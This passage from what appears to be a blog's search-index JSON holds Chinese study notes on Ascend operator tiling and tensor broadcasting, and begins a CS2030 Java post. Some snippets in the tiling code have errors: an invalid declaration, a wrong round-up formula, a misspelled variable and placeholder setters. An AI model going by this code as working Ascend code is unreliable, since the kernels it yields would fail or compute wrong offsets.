id=\"步骤2按照核数拆分数据\">步骤2：按照核数拆分数据</h2>\n<p>尽可能平均分发挥最大性能。例如 42 个 block 分到 4 个核上，分为\n11、11、10、10.</p>\n<h2 id=\"步骤3根据ub限制进行内核数据分批计算\">步骤3：根据UB限制进行内核数据分批计算</h2>\n<p>一个核一次计算的数据大小受到 UB\n限制。<code>get_unified_buffer_size</code> 可以获得 UB 大小。</p>\n<blockquote>\n<p>一个核一次计算的数据块就叫 tile</p>\n</blockquote>\n<p>这里假设 UB 大小为 1536B 。</p>\n<p>以加法为例，x+y=z，计算一下一个 tile 可以放多少个 block。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1536B / 32B = 48 block， 最多一次算 48 block</span><br><span class=\"line\">48 / 2 = 24 , double buffer，折半每次计算的数量，翻倍循环次数</span><br><span class=\"line\">24 / 3 = 8 , 每个变量可以取 8 个 block</span><br></pre></td></tr></table></figure>\n<p>而大核要 11 个block，所以要两次计算，第一次 8 个，第二次 3\n个。小核第二次 2 个。</p>\n<h1 id=\"tiling-算法\">Tiling 算法</h1>\n<h2 id=\"tiling-结构体\">Tiling 结构体</h2>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">namespace</span> optiling {</span><br><span class=\"line\"><span class=\"built_in\">BEGIN_TILING_DATA_DEF</span>(TilingData)</span><br><span class=\"line\">    <span class=\"built_in\">TILING_DATA_FIELD_DEF</span>(<span class=\"type\">uint32_t</span>, bigCoreDataNum); \t<span class=\"comment\">// 大核处理的总数据数量（个）</span></span><br><span class=\"line\">    <span class=\"built_in\">TILING_DATA_FIELD_DEF</span>(<span class=\"type\">uint32_t</span>, smallCoreDataNum); \t<span class=\"comment\">// 小核处理的总数据数量（个）</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">TILING_DATA_FIELD_DEF</span>(<span class=\"type\">uint32_t</span>, finalBigTileNum); \t<span class=\"comment\">// 大核上数据搬运的次数</span></span><br><span class=\"line\">    <span class=\"built_in\">TILING_DATA_FIELD_DEF</span>(<span class=\"type\">uint32_t</span>, finalSmallTileNum);\t<span class=\"comment\">// 小核上数据搬运的次数</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">TILING_DATA_FIELD_DEF</span>(<span class=\"type\">uint32_t</span>, tileDataNum);\t\t<span class=\"comment\">// 单核单次搬运可处理的数据数量</span></span><br><span class=\"line\">    <span class=\"built_in\">TILING_DATA_FIELD_DEF</span>(<span class=\"type\">uint32_t</span>, bigTailDataNum);\t<span class=\"comment\">// 大核最后一次搬运可处理的数据数量</span></span><br><span class=\"line\">    <span class=\"built_in\">TILING_DATA_FIELD_DEF</span>(<span class=\"type\">uint32_t</span>, smallTailDataNum);\t<span class=\"comment\">// 小核最后一次搬运可处理的数据数量</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">TILING_DATA_FIELD_DEF</span>(<span class=\"type\">uint32_t</span>, tailBlockNum);\t\t<span class=\"comment\">// 大核的个数，等于平均分配block的余数</span></span><br><span class=\"line\">END_TILING_DATA_DEF;</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"built_in\">REGISTER_TILING_DATA_CLASS</span>(AddCustom, TilingData)</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"tilingfunc\">TilingFunc</h2>\n<p>以 AddCustom 为例</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">uint32_t</span> BLOCK_SIZE = <span class=\"number\">32</span>; <span class=\"comment\">// block字节数，常量</span></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">uint32_t</span> BUFFER_NUM = <span class=\"number\">2</span>;\t<span class=\"comment\">// double buffer，常量</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> ge::graphStatus <span class=\"title\">TilingFunc</span><span class=\"params\">(gert::TilingContext* context)</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">    TilingData tiling;\t<span class=\"comment\">// 解析tiling结构体</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 每个核一次计算最多能处理的字节数，从接口获取</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> = ubSize; \t</span><br><span class=\"line\">    <span class=\"keyword\">auto</span> ascendcPlatform = platform_ascendc::<span class=\"built_in\">PlatformAscendC</span>(context-&gt;<span class=\"built_in\">GetPlatformInfo</span>());</span><br><span class=\"line\">    ascendcPlatform.<span class=\"built_in\">GetCoreMemSize</span>(platform_ascendc::CoreMemType::UB, ubSize);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 获取AICore数量</span></span><br><span class=\"line\">    <span class=\"keyword\">auto</span> coreNum = ascendcPlatform.<span class=\"built_in\">GetCoreNum</span>();</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 获取输入数据数量, inputNum表示几个元素</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> inputNum = context-&gt;<span class=\"built_in\">GetInputShape</span>(<span class=\"number\">0</span>)-&gt;<span class=\"built_in\">GetStorageShape</span>().<span class=\"built_in\">GetShapeSize</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// typeLength表示输入的数据类型占几个字节，inputLength表示输入数据的总字节</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> typeLength = <span class=\"number\">0</span>;</span><br><span class=\"line\">    ge::TypeUtils::<span class=\"built_in\">GetDataTypeLength</span>(context-&gt;<span class=\"built_in\">GetInputDesc</span>(<span class=\"number\">0</span>)-&gt;<span class=\"built_in\">GetDataType</span>(), typeLength);</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> inputLength = inputNum * typeLength;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// ubDataNumber，x+y=z，理论上应该是3，但是Add接口不支持int8，所以先转换成half进行计算</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> ubDataNumber = (typeLength == <span class=\"number\">1</span>) ? <span class=\"number\">5</span> : <span class=\"number\">3</span>; <span class=\"comment\">// 特殊处理</span></span><br><span class=\"line\">    <span class=\"comment\">// 一个tile里可以存几个block, 一个tile里有几个数据</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> tileBlockNum = (ubSize / BLOCK_SIZE / BUFFER_NUM) / ubDataNumber;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> tileDataNum = (tileBlockNum * BLOCK_SIZE) / typeLength;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 输入数据向上 32B 对齐</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> inputLengthAlign32 = (((inputLength - BLOCK_SIZE - <span class=\"number\">1</span>) / BLOCK_SIZE) * BLOCK_SIZE);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/// 计算核数，即计算上下界。</span></span><br><span class=\"line\">    <span class=\"comment\">// 1. 算上界，最多 coreNum 个核</span></span><br><span class=\"line\">    coreNum = (coreNum &lt; inputLengthAlign32 / BLOCK_SIZE) ? coreNum : inputLengthAlign32 / BLOCK_SIZE; </span><br><span class=\"line\">    <span class=\"comment\">// 2. 算下界，最少 1 个核</span></span><br><span class=\"line\">    coreNum = (coreNum &gt;= <span class=\"number\">1</span>) ? coreNum : <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 3. 每个核平均计算几个block</span></span><br><span class=\"line\">   \t<span class=\"type\">uint32_t</span> everyCoreInputBlockNum = (inputLengthAlign32 / BLOCK_SIZE) / coreNum; </span><br><span class=\"line\">    <span class=\"comment\">// 4. 余数，即需要几个大核</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> tailBlockNum = (inputeLengthAlign32 / BLOCK_SIZE) % coreNum; </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/// 计算小核其他参数</span></span><br><span class=\"line\">    <span class=\"comment\">// 1. 小核处理的总数据数量（个）</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> smallCoreDataNum = everyCoreInputBlockNum * BLOCK_SIZE / typeLength; </span><br><span class=\"line\">    <span class=\"comment\">// 2. 小核Tile数量：finalSmallTileNum</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> smallTileNum = everyCoreInputBlockNum / tileBlockNum; </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> finalSmallTileNum = (everyCoreInputBlockNum % tileBlockNum) == <span class=\"number\">0</span> ? smallTileNum : smallTileNum + <span class=\"number\">1</span>; </span><br><span class=\"line\">    <span class=\"comment\">// 3. 最后一次搬运的数据数量</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> smallTailDataNum = smallCoreDataNum - (tileDataNum * smallTileNum); </span><br><span class=\"line\">    smallTailDataNum = smallTailDataNum == <span class=\"number\">0</span> ? tileDataNum : smallTailDataNum;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/// 计算大核其他参数</span></span><br><span class=\"line\">    everyCoreInputBlockNum += <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 1. 大核处理的总数据数量（个）</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> bigCoreDataNum = everyCoreInputBlockNum * BLOCK_SIZE / typeLength; </span><br><span class=\"line\">    <span class=\"comment\">// 2. 大核Tile数量：finalBigTileNum</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> bigTileNum = everyCoreInputBlockNum / tileBlockNum; </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> finalBigTileNum = (everyCoreInputBlockNum % tileBlockNum) == <span class=\"number\">0</span> ? bigTileNum : bigTileNum + <span class=\"number\">1</span>; </span><br><span class=\"line\">    <span class=\"comment\">// 3. 最后一次搬运的数据数量</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> bigTailDataNum = bigCoreDataNum - (tileDataNum * bigTileNum); </span><br><span class=\"line\">    bigTailDataNum = bigTailDataNum == <span class=\"number\">0</span> ? tileDataNum : bigTailDataNum;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 塞进tiling结构体</span></span><br><span class=\"line\">    tiling.<span class=\"built_in\">set_XXXXXX</span>();</span><br><span class=\"line\">    tiling.<span class=\"built_in\">set_XXXXXX</span>();</span><br><span class=\"line\">    tiling.<span class=\"built_in\">set_XXXXXX</span>();</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"type\">size_t</span> *currentWorkspace = context-&gt;<span class=\"built_in\">GetWorkspaceSizes</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    currentWorkspace[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ge::GRAPH_SUCCESS;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"kernel侧\">Kernel侧</h2>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__aicore__ <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">Init</span><span class=\"params\">(GM_ADDR x, GM_ADDR y, GM_ADDR z, </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                            <span class=\"type\">uint32_t</span> bigCoreDataNum, <span class=\"type\">uint32_t</span> smallCoreDataNum, </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                            <span class=\"type\">uint32_t</span> finalBigTileNum, <span class=\"type\">uint32_t</span> finalSmallTileNum, </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                            <span class=\"type\">uint32_t</span> tileDataNum, </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                            <span class=\"type\">uint32_t</span> bigTailDataNum, <span class=\"type\">uint32_t</span> smallTailDataNum,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                            <span class=\"type\">uint32_t</span> tailBlockNum)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">\t<span class=\"built_in\">ASSERT</span>(<span class=\"built_in\">GetBlockNum</span>() != <span class=\"number\">0</span> &amp;&amp; <span class=\"string\">\"block dim can not be zero!\"</span>); <span class=\"comment\">// 当前任务配置的核数，保证非0</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> blockIdx = <span class=\"built_in\">GetBlockIdx</span>(); <span class=\"comment\">// 当前AIcore编号</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>-&gt;tileDataNum = tileDataNum; <span class=\"comment\">// 除了最后一次，一个tile里的数据数量</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> globalBufferIndex; <span class=\"comment\">// 这个核处理数据的起始地址</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (blockNum &lt; tailBlockNum)  <span class=\"comment\">// 如果是大核</span></span><br><span class=\"line\">    {</span><br><span class=\"line\">        <span class=\"keyword\">this</span>-&gt;coreDataNum = bigCoreDataNum;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>-&gt;tileNum = finalBigTileNum;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>-&gt;tailDataNum = bigTailDataNum;</span><br><span class=\"line\">\t\tglobalBufferIndex = bigCoreDataNum * blockIdx;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">else</span> { <span class=\"comment\">// 小核</span></span><br><span class=\"line\">        <span class=\"keyword\">this</span>-&gt;coreDataNum = smallCoreDataNum;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>-&gt;tileNum = finalSmallTileNum;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>-&gt;tailDataNum = smallTailDataNum;</span><br><span class=\"line\">        globalBufferIndex = bigCoreDataNum * tailBlockNum </span><br><span class=\"line\">            \t\t\t\t+ smallCoreDataNum * (blockIdx - tailBlockNum);</span><br><span class=\"line\">    }</span><br><span class=\"line\">\t</span><br><span class=\"line\">    xGm.<span class=\"built_in\">SetGlobalBuffer</span>((__gm__ TYPE_X*)x + globalBufferIndex, <span class=\"keyword\">this</span>-&gt;coreDataNum);</span><br><span class=\"line\">    yGm.<span class=\"built_in\">SetGlobalBuffer</span>((__gm__ TYPE_Y*)y + globalBufferIndex, <span class=\"keyword\">this</span>-&gt;coreDataNum);</span><br><span class=\"line\">    zGm.<span class=\"built_in\">SetGlobalBuffer</span>((__gm__ TYPE_Z*)z + globalBufferIndex, <span class=\"keyword\">this</span>-&gt;coreDataNum);</span><br><span class=\"line\">    </span><br><span class=\"line\">    pipe.<span class=\"built_in\">InitBuffer</span>(inQueueX, BUFFER_NUM, <span class=\"keyword\">this</span>-&gt;tileDataNum * <span class=\"built_in\">sizeof</span>(TYPE_X));</span><br><span class=\"line\">    pipe.<span class=\"built_in\">InitBuffer</span>(inQueueY, BUFFER_NUM, <span class=\"keyword\">this</span>-&gt;tileDataNum * <span class=\"built_in\">sizeof</span>(TYPE_Y));</span><br><span class=\"line\">    pipe.<span class=\"built_in\">InitBuffer</span>(outQueueZ, BUFFER_NUM, <span class=\"keyword\">this</span>-&gt;tileDataNum * <span class=\"built_in\">sizeof</span>(TYPE_Z));</span><br><span class=\"line\">    pipe.<span class=\"built_in\">InitBuffer</span>(tmp1, <span class=\"keyword\">this</span>-&gt;tileDataNum * <span class=\"built_in\">sizeof</span>(half)); <span class=\"comment\">// 对于int8的特殊处理</span></span><br><span class=\"line\">    pipe.<span class=\"built_in\">InitBuffer</span>(tmp2, <span class=\"keyword\">this</span>-&gt;tileDataNum * <span class=\"built_in\">sizeof</span>(half)); </span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">__aicore__ <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">Process</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">    <span class=\"type\">int32_t</span> loopCount = <span class=\"keyword\">this</span>-&gt;tileNum; <span class=\"comment\">// 循环的次数，等于tile数量</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>-&gt;processDataNum = <span class=\"keyword\">this</span>-&gt;tileDataNum; <span class=\"comment\">// 要处理的数据数量</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int32_t</span> i = <span class=\"number\">0</span>; i &lt; loopCount; i++) {</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i == loopCount - <span class=\"number\">1</span>) { <span class=\"comment\">// 如果是最后一次</span></span><br><span class=\"line\">            <span class=\"keyword\">this</span>-&gt;processDataNum = <span class=\"keyword\">this</span>-&gt;tailDataNum;</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"built_in\">CopyIn</span>(i);</span><br><span class=\"line\">        <span class=\"built_in\">Compute</span>(i);</span><br><span class=\"line\">        <span class=\"built_in\">CopyOut</span>(i);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h1 id=\"总结\">总结</h1>\n<ol type=\"1\">\n<li>数据向上扩展到 32B</li>\n<li>计算出总 block 数</li>\n<li>在各个核里平分 block</li>\n</ol>\n","categories":["笔记"],"tags":["AI","硬件加速","Ascend"]},{"title":"Ascend 学习笔记 04 - 广播机制与Shape推导","url":"/Ascend/04Shape%E6%8E%A8%E5%AF%BC/","content":"<p>测试点一直有一个过不去，然后发现是tensor运算过程中会自动形状推导，这个完全不知道，AI学太少了，，</p>\n<p>代码已经实现了，让AI写一个文档记录一下怎么操作。</p>\n<p>但是，这个方法存在一些性能问题，等下一篇博客。</p>\n<span id=\"more\"></span>\n<h1 id=\"广播机制与shape推导分析\">广播机制与Shape推导分析</h1>\n<p>在深度学习框架中，广播机制允许不同形状的张量在进行算术运算时自动扩展为相同的形状。下面将从host侧和kernel侧分别描述广播机制的实现。</p>\n<h2 id=\"host侧实现\">1. Host侧实现</h2>\n<h3 id=\"输入与输出shape获取\">1.1 输入与输出Shape获取</h3>\n<p>在host侧，首先需要获取输入和输出张量的原始形状：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">auto</span> condShape = context-&gt;<span class=\"built_in\">GetInputShape</span>(<span class=\"number\">0</span>)-&gt;<span class=\"built_in\">GetOriginShape</span>();</span><br><span class=\"line\"><span class=\"keyword\">auto</span> x1Shape = context-&gt;<span class=\"built_in\">GetInputShape</span>(<span class=\"number\">1</span>)-&gt;<span class=\"built_in\">GetOriginShape</span>();</span><br><span class=\"line\"><span class=\"keyword\">auto</span> x2Shape = context-&gt;<span class=\"built_in\">GetInputShape</span>(<span class=\"number\">2</span>)-&gt;<span class=\"built_in\">GetOriginShape</span>();</span><br><span class=\"line\"><span class=\"keyword\">auto</span> yShape = context-&gt;<span class=\"built_in\">GetOutputShape</span>(<span class=\"number\">0</span>)-&gt;<span class=\"built_in\">GetOriginShape</span>();</span><br></pre></td></tr></table></figure>\n<h3 id=\"维度对齐与shape推导\">1.2 维度对齐与Shape推导</h3>\n<p>将所有输入Shape统一到输出Shape的维度，对于低维张量，前面补1：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int32_t</span> i = <span class=\"number\">0</span>; i &lt; yDimNum; i++) {</span><br><span class=\"line\">    yShapeVec[i] = yShape.<span class=\"built_in\">GetDim</span>(yDimNum - <span class=\"number\">1</span> - i);</span><br><span class=\"line\">    condShapeVec[i] = condDimNum - <span class=\"number\">1</span> - i &gt;= <span class=\"number\">0</span> ? condShape.<span class=\"built_in\">GetDim</span>(condDimNum - <span class=\"number\">1</span> - i) : <span class=\"number\">1</span>;</span><br><span class=\"line\">    x1ShapeVec[i] = x1DimNum - <span class=\"number\">1</span> - i &gt;= <span class=\"number\">0</span> ? x1Shape.<span class=\"built_in\">GetDim</span>(x1DimNum - <span class=\"number\">1</span> - i) : <span class=\"number\">1</span>;</span><br><span class=\"line\">    x2ShapeVec[i] = x2DimNum - <span class=\"number\">1</span> - i &gt;= <span class=\"number\">0</span> ? x2Shape.<span class=\"built_in\">GetDim</span>(x2DimNum - <span class=\"number\">1</span> - i) : <span class=\"number\">1</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h3 id=\"stride计算\">1.3 Stride计算</h3>\n<p>根据Shape计算每个维度的stride，用于线性索引的转换：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint32_t</span> y_stride = <span class=\"number\">1</span>, cond_stride = <span class=\"number\">1</span>, x1_stride = <span class=\"number\">1</span>, x2_stride = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; yDimNum; i++) {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (yShapeVec[i] != <span class=\"number\">1</span>) {</span><br><span class=\"line\">        yStrides[i] = y_stride;</span><br><span class=\"line\">        y_stride *= yShapeVec[i];</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\">// ... 同样处理cond, x1, x2的stride</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h3 id=\"广播需求判断\">1.4 广播需求判断</h3>\n<p>检查每个维度是否需要扩展：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint32_t</span> needBroadcast = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; yDimNum; i++) {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (condShapeVec[i] != yShapeVec[i] || x1ShapeVec[i] != yShapeVec[i] || x2ShapeVec[i] != yShapeVec[i]) {</span><br><span class=\"line\">        needBroadcast = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"kernel侧实现\">2. Kernel侧实现</h2>\n<h3 id=\"索引转换\">2.1 索引转换</h3>\n<p>在kernel侧，通常需要一个索引转换函数，将输出张量的线性索引映射到输入张量的线性索引：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__aicore__ <span class=\"keyword\">inline</span> <span class=\"type\">uint32_t</span> <span class=\"title\">convertIndex</span><span class=\"params\">(<span class=\"type\">uint32_t</span> srcIndex, <span class=\"type\">uint32_t</span>* shape, <span class=\"type\">uint32_t</span>* strides)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> dstIndex = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int32_t</span> i = <span class=\"number\">0</span>; i &lt; yDimNum; i++) {</span><br><span class=\"line\">        dstIndex += srcIndex / yStrides[i] % shape[i] * strides[i];</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> dstIndex;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h3 id=\"数据复制与广播\">2.2 数据复制与广播</h3>\n<p>当需要广播时，数据从全局内存到本地缓冲区的复制过程中会调用索引转换函数：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (needBroadcast) {</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; processDataNum; i++) {</span><br><span class=\"line\">        index = <span class=\"built_in\">convertIndex</span>(baseIndex + i, inputShape, inputStrides);</span><br><span class=\"line\">        localBuffer.<span class=\"built_in\">SetValue</span>(i, globalMemory.<span class=\"built_in\">GetValue</span>(index));</span><br><span class=\"line\">    }</span><br><span class=\"line\">} <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"built_in\">DataCopy</span>(localBuffer, globalMemory[progress * tileDataNum], processDataNum);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结\">3. 总结</h2>\n<p>广播机制的Shape推导是一个典型的多维数组处理问题，其核心思路包括：</p>\n<ol type=\"1\">\n<li>维度对齐：将所有输入张量提升到相同维度。</li>\n<li>计算stride：针对各个维度的步长计算。</li>\n<li>索引映射：实现从输出索引到输入索引的映射。</li>\n<li>条件选择：基于条件张量执行元素选择。</li>\n</ol>\n<p>这种实现既支持标准的广播语义，又通过各种优化手段（如内存缓冲区、数据分块、多核协同）来提高计算效率。</p>\n<h1 id=\"优化\">优化</h1>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint32_t</span> x1Index = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">uint32_t</span> q[<span class=\"number\">8</span>] {};</span><br><span class=\"line\"><span class=\"type\">uint32_t</span> r[<span class=\"number\">8</span>] {};</span><br><span class=\"line\"><span class=\"type\">uint32_t</span> indices[<span class=\"number\">8</span>] {};</span><br><span class=\"line\"><span class=\"type\">uint32_t</span> currentOffset = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">uint32_t</span> n = baseIndex;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">uint8_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>-&gt;yDimNum; i++) {</span><br><span class=\"line\">    q[i] = n / yStrides[i];</span><br><span class=\"line\">    r[i] = n % yStrides[i];</span><br><span class=\"line\">    indices[i] = q[i] % yShape[i];</span><br><span class=\"line\">    currentOffset += indices[i] * x1Strides[i];</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">x1Local.<span class=\"built_in\">SetValue</span>(<span class=\"number\">0</span>, x1Gm.<span class=\"built_in\">GetValue</span>(currentOffset));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">1</span>; i &lt; <span class=\"keyword\">this</span>-&gt;processDataNum; i++) {</span><br><span class=\"line\">    n += <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">uint8_t</span> dim = <span class=\"number\">0</span>; dim &lt; <span class=\"keyword\">this</span>-&gt;yDimNum; dim++) {</span><br><span class=\"line\">        r[dim] += <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (r[dim] == yStrides[dim]) {</span><br><span class=\"line\">            r[dim] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            q[dim] += <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"type\">uint32_t</span> new_index = q[dim] % yShape[dim];</span><br><span class=\"line\">            currentOffset += (new_index - indices[dim]) * x1Strides[dim];</span><br><span class=\"line\">            indices[dim] = new_index;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    x1Local.<span class=\"built_in\">SetValue</span>(i, x1Gm.<span class=\"built_in\">GetValue</span>(currentOffset));</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n","categories":["笔记"],"tags":["AI","硬件加速","Ascend"]},{"title":"新加坡国立 CS2030 知识点整理","url":"/CS2030/2024-11-02-%E6%96%B0%E5%8A%A0%E5%9D%A1%E5%9B%BD%E7%AB%8B-CS2030-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/","content":"<ul>\n<li>CS2030 PA2 知识点整理</li>\n<li>Stringable 和 StateM 详细解析</li>\n</ul>\n<span id=\"more\"></span>\n<p>[TOC]</p>\n<h1 id=\"知识点整理\">知识点整理</h1>\n<h2 id=\"纯函数\">1 纯函数</h2>\n<h3 id=\"构造定义纯函数\">1.1 构造（定义纯函数）</h3>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Function&lt;输入参数类型, 返回值类型&gt; f = $Lambda表达式$;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Lambda 表达式形如：</p>\n<ul>\n<li><code>x -&gt; x + 1</code> ：输入参数→返回值</li>\n<li><code>x -&gt; {return x + 1;}</code> 输入参数 → 语句体（内含有\nreturn 返回值）</li>\n</ul>\n</blockquote>\n<p>用数学语言表达，就是： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"12.507ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 5528 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D453\" d=\"M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 